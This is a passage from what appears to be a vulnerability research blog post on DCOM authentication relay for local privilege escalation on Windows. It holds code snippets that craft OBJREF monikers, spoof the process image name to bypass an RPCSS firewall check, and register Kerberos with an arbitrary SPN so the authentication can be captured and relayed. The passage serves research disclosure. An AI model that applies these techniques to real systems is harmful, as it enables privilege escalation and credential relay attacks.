 <p class="c5"><span>The key feature that the exploit abused is standard COM marshaling. Specifically when a COM object is marshaled so that it can be used by a different process or host, the COM runtime generates an </span><span class="c2"><a class="c211" href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/fe6c5e46-adf8-4e34-a8de-3f756c875f31">OBJREF structure</a></span><span>, most commonly the </span><span class="c2"><a class="c211" href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/51312511-36e1-4ab6-993c-523643b11a29">OBJREF_STANDARD</a></span><span class="c9">&nbsp;form. This structure contains all the information necessary to establish a connection between a COM client and the original object in the COM server.</span></p>
 <p class="c0"><span class="c9"></span></p>
 <p class="c5"><span class="c9">Connecting to the original object from the OBJREF is a two part process:</span></p><ol class="c29 lst-kix_4h5ag0d3tyrp-0 start" start="1"><li style="margin-left: 46pt;" class="c5 c34 li-bullet-0"><span>The client extracts the </span><span class="c4">Object Exporter ID (OXID)</span><span class="c9">&nbsp;from the structure and contacts the OXID resolver service specified by the RPC binding information in the OBJREF.</span></li><li style="margin-left: 46pt;" class="c5 c34 li-bullet-0"><span class="c9">The client uses the OXID resolver service to find the RPC binding information of the COM server which hosts the object and establishes a connection to the RPC endpoint to access the object&#39;s interfaces.</span></li></ol>
 <p class="c0"><span class="c9"></span></p>
 <p class="c5"><span class="c9">Both of these steps require establishing an MSRPC connection to an endpoint. Commonly this is either locally over ALPC, or remotely via TCP. If a TCP connection is used then the client will also authenticate to the RPC server using NTLM or Kerberos based on the security bindings in the OBJREF.</span></p>
 <p class="c0"><span class="c9"></span></p>
 <p class="c5"><span>The first key insight I had for </span><span class="c2"><a class="c211" href="https://bugs.chromium.org/p/project-zero/issues/detail?id=325">issue 325</a></span><span class="c9">&nbsp;is that you can construct an OBJREF which will always establish a connection to the OXID resolver service over TCP, even if the service was on the local machine. To do this you specify the hostname as an IP address and an arbitrary TCP port for the client to connect to. This allows you to listen locally and when the RPC connection is made the authentication can be relayed or repurposed. </span></p>
 <p class="c0"><span class="c9"></span></p>
 <p class="c5"><span>This isn&#39;t yet a privilege escalation, since you need to convince a privileged user to unmarshal the OBJREF. This was the second key insight: you could get a privileged service to unmarshal an arbitrary OBJREF easily using the </span><span class="c2"><a class="c211" href="https://docs.microsoft.com/en-us/windows/win32/api/objbase/nf-objbase-cogetinstancefromistorage">CoGetInstanceFromIStorage</a></span><span class="c9">&nbsp;API and activating a privileged COM service. This marshals a COM object, creates the privileged COM server and then unmarshals the object in the server&#39;s security context. This results in an RPC call to the fake OXID resolver authenticated using a privileged user&#39;s credentials. From there the authentication could be relayed to the local system for privilege escalation.</span></p>
 <p class="c0"><span class="c9"></span></p>
 <p class="c5"></p>
  
 <p class="c5"><span class="c4"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEidf0_fh87eJd499r4V31gq2EoxkP1fptUl5KU9lwkDp87pFnA3qdmY3eGRB2HqY878TZp7JhPF7F_LpNcl0ax6g6bsSWgv9sSBUx-SFUXZGssDtAFvL_P_ROZPAZW9tdiUz_06DNaFgIUsqBit5HpztFCv67tZF8EILTkQmONHwZ9U7H5G0D5Dg079/s958/image2%20%285%29.png" style="display: block; padding: 1em 0;text-align: center;"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEidf0_fh87eJd499r4V31gq2EoxkP1fptUl5KU9lwkDp87pFnA3qdmY3eGRB2HqY878TZp7JhPF7F_LpNcl0ax6g6bsSWgv9sSBUx-SFUXZGssDtAFvL_P_ROZPAZW9tdiUz_06DNaFgIUsqBit5HpztFCv67tZF8EILTkQmONHwZ9U7H5G0D5Dg079/s958/image2%20%285%29.png" border="0" alt="Diagram of an DCOM authentication relay attack from issue 325" style="max-height: 750px; max-width: 600px;" /></a></span></p>
 <p class="c0"><span class="c9"></span></p>
 <p class="c5"><span>Being able to redirect the OXID resolver RPC connection locally to a different TCP port was not by design and Microsoft eventually fixed this in Windows 10 1809/Server 2019. The underlying issue prior to Windows 10 1809 was the string containing the host returned as part of the OBJREF was directly concatenated into an </span><span class="c2"><a class="c211" href="https://docs.microsoft.com/en-us/windows/win32/rpc/string-binding">RPC string binding</a></span><span class="c9">. Normally the RPC string binding should have been in the form of:</span></p>
 <p class="c0"><span class="c9"></span></p><a id="t.e77594769c6122f6cc07295f638fefdcc6db828e"></a><a id="t.0"></a><table class="c20"><tbody><tr class="c26"><td class="c31" colspan="1" rowspan="1">
 <p class="c5"><span class="c6">ncacn_ip_tcp:ADDRESS[135]</span></p></td></tr></tbody></table>
 <p class="c0"><span class="c9"></span></p>
 <p class="c5"><span>Where </span><span class="c4">ncacn_ip_tcp</span><span>&nbsp;is the protocol sequence for RPC over TCP, </span><span class="c4">ADDRESS </span><span>is the target address which would come from the string binding, and </span><span class="c4">[135]</span><span class="c9">&nbsp;is the well-known TCP port for the OXID resolver appended by RPCSS. However, as the ADDRESS value is inserted manually into the binding then the OBJREF could specify its own port, resulting in the string binding:</span></p>
 <p class="c0"><span class="c9"></span></p><a id="t.97aa81be1b3e01eee48e6be87e60b7c9ec811e04"></a><a id="t.1"></a><table class="c20"><tbody><tr class="c26"><td class="c31" colspan="1" rowspan="1">
 <p class="c5"><span class="c6">ncacn_ip_tcp:ADDRESS[9999][135]</span></p></td></tr></tbody></table>
 <p class="c0"><span class="c9"></span></p>
 <p class="c5"><span>The RPC runtime would just pick the first port in the binding string to connect to, in this case 9999, and would ignore the second port 135. This behavior was fixed by calling the </span><span class="c2"><a class="c211" href="https://docs.microsoft.com/en-us/windows/win32/api/rpcdce/nf-rpcdce-rpcstringbindingcomposew">RpcStringBindingCompose</a></span><span class="c9">&nbsp;API which will correctly escape the additional port number which ensures it&#39;s ignored when making the RPC connection.</span></p>
 <p class="c0"><span class="c9"></span></p>
 <p class="c5"><span>This is where the </span><span class="c2"><a class="c211" href="https://www.sentinelone.com/labs/relaying-potatoes-another-unexpected-privilege-escalation-vulnerability-in-windows-rpc-protocol/">RemotePotato exploit</a></span><span>, developed by </span><span class="c2"><a class="c211" href="https://twitter.com/splinter_code">Antonio Cocomazzi</a></span><span>&nbsp;and </span><span class="c2"><a class="c211" href="https://twitter.com/decoder_it">Andrea Pierini</a></span><span>, comes into the picture. While it was no longer possible to redirect the OXID resolving to a local TCP server, you could redirect the initial connection to an external server. A call is made to the </span><span class="c2"><a class="c211" href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/65292e10-ef0c-43ee-bce7-788e271cc794">IObjectExporter::ResolveOxid2</a></span><span class="c9">&nbsp;method which can return an arbitrary RPC binding string for a fake COM object. </span></p>
 <p class="c0"><span class="c9"></span></p>
 <p class="c5"><span class="c9">Unlike the OXID resolver binding string, the one for the COM object is allowed to contain an arbitrary TCP port. By returning a binding string for the original host on an arbitrary TCP port, the second part of the connection process can be relayed rather than the first. The relayed authentication can then be sent to a domain server, such as LDAP or SMB, as long as they don&#39;t enforce signing.</span></p>
 <p class="c0"><span class="c9"></span></p>
 <p class="c5"></p>
  
 <p class="c5"><span class="c4"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhyrByRoxwgw3esO67XtK4FiB9Ee14So3I32nGdQJ_ZY1hLVjCPANB7jeGeUHiyi4GZ8LcHjr8UizWip0KoOhWF7pyPIN5Wi_zRzZGWeHI4RgUeiALaZOgesnzd5LVFq_gnU-_hOMo6s6J3Nm9xAp_zWtibxbjq5uQwUDb0lFNde1mJw3GC3OdGc-nU/s1302/image5%20%282%29.png" style="display: block; padding: 1em 0;text-align: center;"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhyrByRoxwgw3esO67XtK4FiB9Ee14So3I32nGdQJ_ZY1hLVjCPANB7jeGeUHiyi4GZ8LcHjr8UizWip0KoOhWF7pyPIN5Wi_zRzZGWeHI4RgUeiALaZOgesnzd5LVFq_gnU-_hOMo6s6J3Nm9xAp_zWtibxbjq5uQwUDb0lFNde1mJw3GC3OdGc-nU/s1200/image5%20%282%29.png" border="0" alt="Diagram of an DCOM authentication relay attack from Remote Potato" style="max-height: 750px; max-width: 600px;" /></a></span></p>
 <p class="c0"><span class="c9"></span></p>
 <p class="c5"><span class="c9">This exploit has the clear disadvantage of requiring an external machine to act as the target of the initial OXID resolving. While investigating the Kerberos authentication relay attacks for DCOM, could I find a way to do everything on the same machine?</span></p><h2 class="c23" id="h.ifb7mhiinb48"><span class="c17 c25">Remote &#10140; Local Potato</span></h2>
 <p class="c5"><span class="c9">If we&#39;re relaying the authentication for the second RPC connection, could we get the local OXID resolver to do the work for us and resolve to a local COM server on a randomly selected port? One of my goals is to write the least amount of code, which is why we&#39;ll do everything in C# and .NET.</span></p>
 <p class="c0"><span class="c9"></span></p><a id="t.78af739dc60f8ded5f3815bfc652d7621558437e"></a><a id="t.2"></a><table class="c20"><tbody><tr class="c26"><td class="c31" colspan="1" rowspan="1">
 <p class="c1"><span class="c12 c13">byte</span><span class="c6">[] ba = GetMarshalledObject(new object());</span></p>
 <p class="c1"><span class="c12 c13">var</span><span class="c6">&nbsp;std = COMObjRefStandard.FromArray(ba);</span></p>
 <p class="c1"><span class="c12">Console.WriteLine(</span><span class="c12 c27">&quot;IPID: {0}&quot;</span><span class="c6">, std.Ipid);</span></p>
 <p class="c1"><span class="c12">Console.WriteLine(</span><span class="c12 c27">&quot;OXID: {0:X08}&quot;</span><span class="c6">, std.Oxid);</span></p>
 <p class="c1"><span class="c12">Console.WriteLine(</span><span class="c12 c27">&quot;OID : {0:X08}&quot;</span><span class="c6">, std.Oid);</span></p>
 <p class="c1"><span class="c6">std.StringBindings.Clear();</span></p>
 <p class="c1"><span class="c12">std.StringBindings.Add(RpcTowerId.Tcp, </span><span class="c12 c27">&quot;127.0.0.1&quot;</span><span class="c6">);</span></p>
 <p class="c1"><span class="c12">Console.WriteLine(</span><span class="c12 c27">$&quot;objref:</span><span class="c12">{0}</span><span class="c12 c27">:&quot;</span><span class="c12">, Convert.ToBase64String(std.ToArray());</span></p></td></tr></tbody></table>
 <p class="c0"><span class="c9"></span></p>
 <p class="c5"><span>This code creates a basic .NET object and COM marshals it to a standard OBJREF. I&#39;ve left out the code for the marshalling and parsing of the OBJREF, but much of that is already present in the linked </span><span class="c2"><a class="c211" href="https://bugs.chromium.org/p/project-zero/issues/detail?id=325">issue 325</a></span><span class="c9">. We then modify the list of string bindings to only include a TCP binding for 127.0.0.1, forcing the OXID resolver to use TCP. If you specify a computer&#39;s hostname then the OXID resolver will use ALPC instead. Note that the string bindings in the OBJREF are only for binding to the OXID resolver, not the COM server itself.</span></p>
 <p class="c0"><span class="c9"></span></p>
 <p class="c5"><span>We can then convert the modified OBJREF into an </span><span class="c2"><a class="c211" href="https://docs.microsoft.com/en-us/windows/win32/api/objbase/nf-objbase-createobjrefmoniker">objref moniker</a></span><span>. This </span><span>format is useful as it allows us to trivially unmarshal the object in another process by calling the </span><span class="c2"><a class="c211" href="https://docs.microsoft.com/en-us/dotnet/api/system.runtime.interopservices.marshal.bindtomoniker">Marshal::BindToMoniker</a></span><span class="c9">&nbsp;API in .NET and passing the moniker string. For example to bind to the COM object in PowerShell you can run the following command:</span></p>
 <p class="c0"><span class="c9"></span></p><a id="t.aa280acd79392ba85d8386c23bd09616ceb0921a"></a><a id="t.3"></a><table class="c20"><tbody><tr class="c26"><td class="c31" colspan="1" rowspan="1">
 <p class="c1"><span class="c7">[</span><span class="c12 c24">Runtime.InteropServices.Marshal</span><span class="c7">]::</span><span class="c12">BindToMoniker(</span><span class="c12 c14">&quot;objref:TUVP...:&quot;</span><span class="c12">)</span></p></td></tr></tbody></table>
 <p class="c0"><span class="c9"></span></p>
 <p class="c5"><span class="c9">Immediately after binding to the moniker a firewall dialog is likely to appear as shown:</span></p>
 <p class="c5"></p>
  
  
 <p class="c5"><span class="c4"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg5k-8HEb-Iw-6zAMqoicT-dV3S7M6SoG2KtLaksWCOLvt3PYRSsV0n3jLa4pjb9NgoJ0HuTOslYPUbVO0hi-Nnf5gIWEfp7Hqy8aa8YwGhnjUs-slWihaWlPPCMOSny-31V-6hyRNQwi78Ddh1Y-T2187oK3KWEvRdGXsLqsjaXFTRGZbNET_8-Dgi/s790/image4%20%283%29.png" style="display: block; padding: 1em 0;text-align: center;"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg5k-8HEb-Iw-6zAMqoicT-dV3S7M6SoG2KtLaksWCOLvt3PYRSsV0n3jLa4pjb9NgoJ0HuTOslYPUbVO0hi-Nnf5gIWEfp7Hqy8aa8YwGhnjUs-slWihaWlPPCMOSny-31V-6hyRNQwi78Ddh1Y-T2187oK3KWEvRdGXsLqsjaXFTRGZbNET_8-Dgi/s790/image4%20%283%29.png" border="0" alt="Firewall dialog for the COM server when a TCP binding is created" style="max-height: 750px; max-width: 600px;" /></a></span></p>
 <p class="c0"><span class="c9"></span></p>
 <p class="c5"><span class="c9">This is requesting the user to allow our COM server process access to listen on all network interfaces for incoming connections. This prompt only appears when the client tries to resolve the OXID as DCOM supports dynamic RPC endpoints. Initially when the COM server starts it only listens on ALPC, but the RPCSS service can ask the server to bind to additional endpoints.</span></p>
 <p class="c0"><span class="c9"></span></p>
 <p class="c5"><span>This request is made through an internal RPC interface that every COM server implements for use by the RPCSS service. One of the functions on this interface is </span><span class="c4">UseProtSeq</span><span>, which requests that the COM server enables a TCP endpoint. When the COM server receives the </span><span class="c4">UseProtSeq </span><span class="c9">call it tries to bind a TCP server to all interfaces, which subsequently triggers the Windows Defender Firewall to prompt the user for access. </span></p>
 <p class="c0"><span class="c9"></span></p>
 <p class="c5"><span class="c9">Enabling the firewall permission requires administrator privileges. However, as we only need to listen for connections via localhost we shouldn&#39;t need to modify the firewall so the dialog can be dismissed safely. However, going back to the COM client we&#39;ll see an error reported.</span></p>
 <p class="c0"><span class="c9"></span></p><a id="t.f650b0d01b77aecef2325462507e753c659f0187"></a><a id="t.4"></a><table class="c20"><tbody><tr class="c26"><td class="c31" colspan="1" rowspan="1">
 <p class="c1"><span class="c6">Exception calling &quot;BindToMoniker&quot; with &quot;1&quot; argument(s): </span></p>
 <p class="c1"><span class="c6">&quot;The RPC server is unavailable. (Exception from HRESULT: 0x800706BA)&quot;</span></p></td></tr></tbody></table>
 <p class="c0"><span class="c9"></span></p>
 <p class="c5"><span class="c9">If we allow our COM server executable through the firewall, the client is able to connect over TCP successfully. Clearly the firewall is affecting the behavior of the COM client in some way even though it shouldn&#39;t. Tracing through the unmarshalling process in the COM client, the error is being returned from RPCSS when trying to resolve the OXID&#39;s binding information. This would imply that no connection attempt is made, and RPCSS is detecting that the COM server wouldn&#39;t be allowed through the firewall and refusing to return any binding information for TCP.</span></p>
 <p class="c0"><span class="c9"></span></p>
 <p class="c5"><span class="c9">Further digging into RPCSS led me to the following function:</span></p><a id="t.adfd20381e0d0a060d62f6d9e908c9386f1297f0"></a><a id="t.5"></a><table class="c20"><tbody><tr class="c26"><td class="c31" colspan="1" rowspan="1">
 <p class="c1"><span class="c11">BOOL IsPortOpen</span><span class="c3">(</span><span class="c11">LPWSTR ImageFileName</span><span class="c3">,</span><span class="c11">&nbsp;</span><span class="c10">int</span><span class="c11">&nbsp;PortNumber</span><span class="c3">)</span><span class="c11">&nbsp;</span><span class="c3 c17">{</span></p>
 <p class="c1"><span class="c11">&nbsp; INetFwMgr</span><span class="c3">*</span><span class="c11">&nbsp;mgr</span><span class="c3 c17">;</span></p>
 <p class="c1"><span class="c6 c33">&nbsp; </span></p>
 <p class="c1"><span class="c11">&nbsp; CoCreateInstance</span><span class="c3">(</span><span class="c11">CLSID_FwMgr</span><span class="c3">,</span><span class="c11">&nbsp;</span><span class="c16 c13">NULL</span><span class="c3">,</span><span class="c11">&nbsp;CLSCTX_INPROC_SERVER</span><span class="c3">,</span><span class="c6 c33">&nbsp;</span></p>
 <p class="c1"><span class="c11">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;IID_PPV_ARGS</span><span class="c3">(&amp;</span><span class="c11">mgr</span><span class="c3 c17">));</span></p>
 <p class="c1"><span class="c11">&nbsp; VARIANT Allowed</span><span class="c3 c17">;</span></p>
 <p class="c1"><span class="c11">&nbsp; VARIANT Restricted</span><span class="c3 c17">;</span></p>
 <p class="c1"><span class="c11">&nbsp; mgr</span><span class="c3">-&gt;</span><span class="c11">IsPortAllowed</span><span class="c3">(</span><span class="c11">ImageFileName</span><span class="c3">,</span><span class="c11">&nbsp;NET_FW_IP_VERSION_ANY</span><span class="c3">,</span><span class="c6 c33">&nbsp;</span></p>
 <p class="c1"><span class="c11">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;PortNumber</span><span class="c3">,</span><span class="c11">&nbsp;</span><span class="c16 c13">NULL</span><span class="c3">,</span><span class="c11">&nbsp;NET_FW_IP_PROTOCOL_TCP</span><span class="c3 c17">,</span></p>
 <p class="c1"><span class="c11">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c3">&amp;</span><span class="c11">Allowed</span><span class="c3">,</span><span class="c11">&nbsp;</span><span class="c3">&amp;</span><span class="c11">Restricted</span><span class="c3 c17">);</span></p>
 <p class="c1"><span class="c11">&nbsp; </span><span class="c16 c13">if</span><span class="c11">&nbsp;</span><span class="c3">(</span><span class="c11">VT_BOOL </span><span class="c3">!=</span><span class="c11">&nbsp;Allowed</span><span class="c3">.</span><span class="c11">vt</span><span class="c3 c17">)</span></p>
 <p class="c1"><span class="c11">&nbsp; &nbsp; </span><span class="c13 c16">return</span><span class="c11">&nbsp;FALSE</span><span class="c3 c17">;</span></p>
 <p class="c1 c19"><span class="c3 c17"></span></p>
 <p class="c1"><span class="c11">&nbsp; </span><span class="c16 c13">return</span><span class="c11">&nbsp;Allowed</span><span class="c3">.</span><span class="c11">boolVal </span><span class="c3">==</span><span class="c11">&nbsp;VARIANT_TRUE</span><span class="c3 c17">;</span></p>
 <p class="c1"><span class="c3">}</span></p></td></tr></tbody></table>
 <p class="c0"><span class="c9"></span></p>
 <p class="c5"><span>This function uses the </span><span class="c4">HNetCfg.FwMgr</span><span>&nbsp;COM object, and calls </span><span class="c2"><a class="c211" href="https://docs.microsoft.com/en-us/windows/win32/api/netfw/nf-netfw-inetfwmgr-isportallowed">INetFwMgr::IsPortAllowed</a></span><span class="c9">&nbsp;to determine if the process is allowed to listen on the specified TCP port. This function is called for every TCP binding when enumerating the COM server&#39;s bindings to return to the client. RPCSS passes the full path to the COM server&#39;s executable and the listening TCP port. If the function returns FALSE then RPCSS doesn&#39;t consider it valid and won&#39;t add it to the list of potential bindings. </span></p>
 <p class="c0"><span class="c9"></span></p>
 <p class="c5"><span>If the OXID resolving process doesn&#39;t have any binding at the end of the lookup process it will return the </span><span class="c4">RPC_S_SERVER_UNAVAILABLE</span><span class="c9">&nbsp;error and the COM client will fail to bind to the server. How can we get around this limitation without needing administrator privileges to allow our server through the firewall? We can convert this C++ code into a small PowerShell function to test the behavior of the function to see what would grant access.</span></p>
 <p class="c0"><span class="c9"></span></p><a id="t.8dadc02f2dd955da5d84ce378d816be40d1bf022"></a><a id="t.6"></a><table class="c20"><tbody><tr class="c26"><td class="c31" colspan="1" rowspan="1">
 <p class="c1"><span class="c12 c30">function</span><span class="c12">&nbsp;</span><span class="c12 c28">Test-IsPortOpen</span><span class="c6">&nbsp;{</span></p>
 <p class="c1"><span class="c12">&nbsp; &nbsp; </span><span class="c12 c30">param</span><span class="c6">(</span></p>
 <p class="c1"><span class="c12">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c7">[</span><span class="c12 c24">string</span><span class="c7">]</span><span class="c8">$Name</span><span class="c7 c17">,</span></p>
 <p class="c1"><span class="c12">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c7">[</span><span class="c12 c24">int</span><span class="c7">]</span><span class="c8 c17">$Port</span></p>
 <p class="c1"><span class="c6">&nbsp; &nbsp; )</span></p>
 <p class="c1 c19"><span class="c6"></span></p>
 <p class="c1"><span class="c12">&nbsp; &nbsp; </span><span class="c8">$mgr</span><span class="c12">&nbsp;</span><span class="c7">=</span><span class="c12">&nbsp;</span><span class="c12 c13">New-Object</span><span class="c12">&nbsp;</span><span class="c12 c32">-ComObject</span><span class="c12">&nbsp;</span><span class="c12 c17 c14">&quot;HNetCfg.FwMgr&quot;</span></p>
 <p class="c1"><span class="c12">&nbsp; &nbsp; </span><span class="c8">$allow</span><span class="c12">&nbsp;</span><span class="c7">=</span><span class="c12">&nbsp;</span><span class="c8 c17">$null</span></p>
 <p class="c1"><span class="c12">&nbsp; &nbsp; </span><span class="c8">$mgr</span><span class="c7">.</span><span class="c12">IsPortAllowed(</span><span class="c8">$Name</span><span class="c7">,</span><span class="c12">&nbsp;</span><span class="c12 c18">2</span><span class="c7">,</span><span class="c12">&nbsp;</span><span class="c8">$Port</span><span class="c7">,</span><span class="c12">&nbsp;</span><span class="c12 c14">&quot;&quot;</span><span class="c7">,</span><span class="c12">&nbsp;</span><span class="c12 c18">6</span><span class="c7">,</span><span class="c12">&nbsp;</span><span class="c7">[</span><span class="c12 c24">ref</span><span class="c7">]</span><span class="c8">$allow</span><span class="c7">,</span><span class="c12">&nbsp;</span><span class="c8">$null</span><span class="c6">)</span></p>
 <p class="c1"><span class="c12">&nbsp; &nbsp; </span><span class="c8 c17">$allow</span></p>
 <p class="c1"><span class="c6">}</span></p>
 <p class="c1 c19"><span class="c6"></span></p>
 <p class="c1"><span class="c12 c30">foreach</span><span class="c12">(</span><span class="c8">$f</span><span class="c12">&nbsp;</span><span class="c12 c30">in</span><span class="c12">&nbsp;$(</span><span class="c12 c13">ls</span><span class="c12">&nbsp;</span><span class="c12 c14">&quot;$env:WINDIR\system32\*.exe&quot;</span><span class="c6">)) { &nbsp; &nbsp;</span></p>
 <p class="c1"><span class="c12">&nbsp; &nbsp; </span><span class="c12 c30">if</span><span class="c12">&nbsp;(</span><span class="c12 c13">Test-IsPortOpen</span><span class="c12">&nbsp;</span><span class="c8">$f</span><span class="c7">.</span><span class="c12">FullName </span><span class="c12 c18">12345</span><span class="c6">) {</span></p>
 <p class="c1"><span class="c12">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c12 c13">Write-Host</span><span class="c12">&nbsp;</span><span class="c8">$f</span><span class="c7">.</span><span class="c6">Fullname</span></p>
 <p class="c1"><span class="c6">&nbsp; &nbsp; }</span></p>
 <p class="c1"><span class="c12">}</span></p></td></tr></tbody></table>
 <p class="c0"><span class="c9"></span></p>
 <p class="c5"><span>This script enumerates all executable files in system32 and checks if they&#39;d be allowed to connect to TCP port 12345. Normally the TCP port would be selected automatically, however the COM server can use the </span><span class="c2"><a class="c211" href="https://docs.microsoft.com/en-us/windows/win32/api/rpcdce/nf-rpcdce-rpcserveruseprotseqep">RpcServerUseProtseqEp</a></span><span class="c9">&nbsp;API to pre-register a known TCP port for RPC communication, so we&#39;ll just pick port 12345.</span></p>
 <p class="c0"><span class="c9"></span></p>
 <p class="c5"><span>The only executable in system32 that returns true from </span><span class="c4">Test-IsPortOpen</span><span>&nbsp;is </span><span class="c4">svchost.exe</span><span class="c9">. That makes some sense, the default firewall rules usually permit a limited number of services to be accessible through the firewall, the majority of which are hosted in a shared service process.</span></p>
 <p class="c0"><span class="c9"></span></p>
 <p class="c5"><span>This check doesn&#39;t guarantee a COM server will be allowed through the firewall, just that it&#39;s potentially accessible in order to return a TCP binding string. As the connection will be via localhost we don&#39;t need to be allowed through the firewall, only that </span><span class="c4">IsPortOpen </span><span class="c9">thinks we could be open. How can we spoof the image filename?</span></p>
 <p class="c0"><span class="c9"></span></p>
 <p class="c5"><span>The obvious trick would be to create a </span><span class="c4">svchost.exe</span><span>&nbsp;process and inject our own code in there. However, that is harder to achieve through pure .NET code and also injecting into an </span><span class="c4">svchost </span><span class="c9">executable is a bit of a red flag if something is monitoring for malicious code which might make the exploit unreliable. Instead, perhaps we can influence the image filename used by RPCSS?</span></p>
 <p class="c0"><span class="c9"></span></p>
 <p class="c5"><span>Digging into the COM runtime, when a COM server registers itself with RPCSS it passes its own image filename as part of the registration information. The runtime gets the image filename through a call to </span><span class="c2"><a class="c211" href="https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getmodulefilenamew">GetModuleFileName</a></span><span>, which gets the value from the </span><span class="c4">ImagePathName</span><span class="c9">&nbsp;field in the process parameters block referenced by the PEB. </span></p>
 <p class="c0"><span class="c9"></span></p>
 <p class="c5"><span class="c9">We can modify this string in our own process to be anything we like, then when COM is initialized, that will be sent to RPCSS which will use it for the firewall check. Once the check passes, RPCSS will return the TCP string bindings for our COM server when unmarshalling the OBJREF and the client will be able to connect. This can all be done with only minor in-process modifications from .NET and no external servers required.</span></p><h2 class="c23" id="h.87n38litfqxj"><span class="c25 c17">Capturing Authentication</span></h2>
 <p class="c5"><span class="c9">At this point a new RPC connection will be made to our process to communicate with the marshaled COM object. During that process the COM client must authenticate, so we can capture and relay that authentication to another service locally or remotely. What&#39;s the best way to capture that authentication traffic?</span></p>
 <p class="c0"><span class="c9"></span></p>
 <p class="c5"><span>Before we do anything we need to select what authentication we want to receive, and this will be reflected in the OBJREF&#39;s security bindings. As we&#39;re doing everything using the existing COM runtime we can register what RPC authentication services to use when calling </span><span class="c2"><a class="c211" href="https://docs.microsoft.com/en-us/windows/win32/api/combaseapi/nf-combaseapi-coinitializesecurity">CoInitializeSecurity</a></span><span>&nbsp;in the COM server through the </span><span class="c4">asAuthSvc</span><span class="c9">&nbsp;parameter.</span></p>
 <p class="c0"><span class="c9"></span></p><a id="t.5188af134394dbd4e93278caa48ce70cc2e7b4b8"></a><a id="t.7"></a><table class="c20"><tbody><tr class="c26"><td class="c31" colspan="1" rowspan="1">
 <p class="c1"><span class="c12 c13">var</span><span class="c12">&nbsp;svcs = </span><span class="c12 c13">new</span><span class="c6">&nbsp;SOLE_AUTHENTICATION_SERVICE[] { </span></p>
 <p class="c1"><span class="c12 c13">&nbsp; &nbsp; new</span><span class="c6">&nbsp;SOLE_AUTHENTICATION_SERVICE() { </span></p>
 <p class="c1"><span class="c6">&nbsp; &nbsp; &nbsp; dwAuthnSvc = RpcAuthenticationType.Kerberos,</span></p>
 <p class="c1"><span class="c12">&nbsp; &nbsp; &nbsp; pPrincipalName = </span><span class="c12 c27">&quot;HOST/DC.domain.com&quot;</span></p>
 <p class="c1"><span class="c6">&nbsp; &nbsp; }</span></p>
 <p class="c1"><span class="c6">};</span></p>
 <p class="c1"><span class="c12 c13">var</span><span class="c12">&nbsp;str = SetProcessModuleName(</span><span class="c12 c27">&quot;System&quot;</span><span class="c6">);</span></p>
 <p class="c1"><span class="c12 c17 c13">try</span></p>
 <p class="c1"><span class="c6">{</span></p>
 <p class="c1"><span class="c6">&nbsp; &nbsp;CoInitializeSecurity(IntPtr.Zero, svcs.Length, svcs, </span></p>
 <p class="c1"><span class="c6">&nbsp; &nbsp; &nbsp; &nbsp; IntPtr.Zero, AuthnLevel.RPC_C_AUTHN_LEVEL_DEFAULT,</span></p>
 <p class="c1"><span class="c6">&nbsp; &nbsp; &nbsp; &nbsp; ImpLevel.RPC_C_IMP_LEVEL_IMPERSONATE, IntPtr.Zero,</span></p>
 <p class="c1"><span class="c6">&nbsp; &nbsp; &nbsp; &nbsp; EOLE_AUTHENTICATION_CAPABILITIES.EOAC_DYNAMIC_CLOAKING,</span></p>
 <p class="c1"><span class="c6">&nbsp; &nbsp; &nbsp; &nbsp; IntPtr.Zero);</span></p>
 <p class="c1"><span class="c6">}</span></p>
 <p class="c1"><span class="c12 c13 c17">finally</span></p>
 <p class="c1"><span class="c6">{</span></p>
 <p class="c1"><span class="c6">&nbsp; &nbsp; SetProcessModuleName(str);</span></p>
 <p class="c1"><span class="c12">}</span></p></td></tr></tbody></table>
 <p class="c0"><span class="c9"></span></p>
 <p class="c5"><span>In the above code, we register to only receive Kerberos authentication and we can also specify an arbitrary SPN as I described in the </span><span class="c2"><a class="c211" href="https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html">previous blog post</a></span><span>. One thing to note is that the call to </span><span class="c4">CoInitializeSecurity</span><span class="c9">&nbsp;will establish the connection to RPCSS and pass the executable filename. Therefore we need to modify the filename before calling the API as we can&#39;t change it after the connection has been established. </span></p>
 <p class="c0"><span class="c9"></span></p>
 <p class="c5"><span>For </span><span>swag</span><span>&nbsp;points I specify the filename </span><span class="c4">System</span><span>&nbsp;rather than build the full path to </span><span class="c4">svchost.exe</span><span>. This is the </span><span>name assigned to the kernel which is also granted access through the firewall. We restore the original filename after the call to </span><span class="c4">CoInitializeSecurity </span><span class="c9">to reduce the risk of it breaking something unexpectedly.</span></p>
 <p class="c0"><span class="c9"></span></p>
 <p class="c5"><span class="c9">That covers the selection of the authentication service to use, but doesn&#39;t help us actually capture that authentication. My first thought to capture the authentication was to find the socket handle for the TCP server, close it and create a new socket in its place. Then I could directly process the RPC protocol and parse out the authentication. This felt somewhat risky as the RPC runtime would still think it has a valid TCP server socket and might fail in unexpected ways. Also it felt like a lot of work, when I have a perfectly good RPC protocol parser built into Windows.</span></p>
 <p class="c0"><span class="c9"></span></p>
 <p class="c5"><span>I then resigned myself to hooking the SSPI APIs, although ideally I&#39;d prefer not to do so. However, once I started looking at the RPC runtime library there weren&#39;t any imports for the SSPI APIs to hook into and I really didn&#39;t want to patch the functions themselves. It turns out that the RPC runtime loads security packages dynamically, based on the authentication service requested and the configuration of the </span><span class="c4">HKLM\SOFTWARE\Microsoft\Rpc\SecurityService</span><span class="c9">&nbsp;registry key.</span></p>
